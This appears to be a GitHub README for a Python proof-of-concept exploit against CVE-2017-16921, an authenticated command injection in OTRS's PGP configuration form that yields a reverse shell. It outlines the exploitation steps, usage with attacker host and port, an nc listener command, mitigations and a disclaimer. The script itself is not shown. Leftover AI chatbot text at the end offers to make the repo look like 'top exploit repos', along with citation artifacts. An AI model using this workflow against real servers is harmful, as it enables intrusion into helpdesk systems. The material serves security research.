# OTRS 4.0.1 – 6.0.1 Remote Command Execution (CVE‑2017‑16921)

![Python](https://img.shields.io/badge/language-python-blue)
![Exploit](https://img.shields.io/badge/type-RCE-red)
![Status](https://img.shields.io/badge/status-POC-green)
![License](https://img.shields.io/badge/license-Research-lightgrey)

Proof‑of‑Concept exploit for **CVE‑2017‑16921**, a Remote Command Execution vulnerability affecting multiple versions of **OTRS (Open Ticket Request System)**.

This script automates authentication to the OTRS agent interface and abuses a flaw in the **PGP configuration form parameters** to execute arbitrary commands on the target system.

The exploit can be used to obtain a **reverse shell** from vulnerable OTRS installations.

---

# Overview

OTRS is a widely used open‑source helpdesk and ticket management system used by organizations to handle support requests.

A vulnerability exists in several OTRS versions where **form parameters related to the PGP configuration interface are not properly sanitized**.

An attacker authenticated as an **OTRS agent** can manipulate these parameters to inject system commands that are executed by the server.

This repository provides a Python implementation that demonstrates exploitation of this vulnerability.

---

# Vulnerability Information

| Field | Value |
|------|------|
| CVE | CVE-2017-16921 |
| Vulnerability Type | Command Injection |
| Impact | Remote Command Execution |
| Privileges Required | Authenticated (Agent) |
| CVSS Score | High |
| CWE | CWE-78 (OS Command Injection) |

The vulnerability allows an authenticated attacker to execute arbitrary shell commands with the privileges of the **OTRS service user or the web server user**. :contentReference[oaicite:0]{index=0}

---

# Affected Versions

The following OTRS versions are vulnerable:

- OTRS **4.0.x ≤ 4.0.26**
- OTRS **5.0.x ≤ 5.0.24**
- OTRS **6.0.x ≤ 6.0.1**

If the application is not patched, an attacker with agent credentials can exploit the vulnerability. :contentReference[oaicite:1]{index=1}

---

# Exploitation Workflow

The exploit follows these steps:

1. Connect to the OTRS login panel.
2. Authenticate using valid **agent credentials**.
3. Extract the required **session cookies**.
4. Retrieve the **ChallengeToken** required for authenticated requests.
5. Access the **PGP configuration endpoint**.
6. Inject a malicious command through vulnerable parameters.
7. Trigger execution on the server.
8. Establish a **reverse shell connection**.

---

# Features

- Automated login to the OTRS agent panel
- Automatic retrieval of **ChallengeToken**
- Command injection via vulnerable parameters
- Reverse shell support
- Lightweight Python implementation
- Minimal external dependencies

---

# Repository Structure

├── CVE-2017-16921.py
└── README.md

| File | Description |
|-----|-------------|
| CVE-2017-16921.py | Python exploit script |
| README.md | Documentation |

---

# Requirements

The exploit requires:

- Python **3.x**
- Python `requests` module
- Valid **OTRS agent credentials**
- Network access to the target server

Install dependencies:

```bash
pip3 install requests

Usage

Run the exploit script:

python3 CVE-2017-16921.py

Example usage:

python3 CVE-2017-16921.py \
--url http://target/otrs/index.pl \
--username agent_user \
--password password \
--lhost 10.10.14.5 \
--lport 4444

Reverse Shell Listener

Before executing the exploit, start a listener:

nc -lvnp 4444
If exploitation is successful, the target server will connect back to your listener.

Example Attack Scenario

Attacker obtains valid OTRS agent credentials.

The exploit logs into the OTRS agent interface.

A malicious payload is injected through the PGP configuration form.

The server executes the injected shell command.

A reverse shell connection is established.

Impact

Successful exploitation may allow an attacker to:

Execute arbitrary OS commands

Read sensitive files

Access internal systems

Pivot within the network

Potentially escalate privileges

Mitigation

To protect against this vulnerability:

Upgrade OTRS to a patched version

Restrict access to the agent interface

Apply strong authentication policies

Monitor logs for suspicious activity

Use network segmentation

References

Exploit‑DB
https://www.exploit-db.com/exploits/43853

MITRE CVE
https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-16921

OTRS Security Advisory
https://www.otrs.com/security-advisory

Credits

Hex_26 – ChallengeToken retrieval implementation

Bæln0rn – Original exploit research

SmarttFoxx – Adaptation and Python implementation

Disclaimer

This project is intended for educational purposes and authorized security testing only.

The author is not responsible for misuse or illegal activities performed using this code.

Always obtain explicit permission before testing security vulnerabilities.

⭐ If you find this project useful, consider giving it a star.


---

✅ If you want, I can also show you **3 things that will instantly make your repo look 10x more professional:**

- add **exploit screenshots**
- add **CLI arguments (`-h`) section**
- add **GitHub security researcher style badges + exploit demo**

Your repo will look like **top exploit repos on GitHub**, not “lame”.
::contentReference[oaicite:2]{index=2}
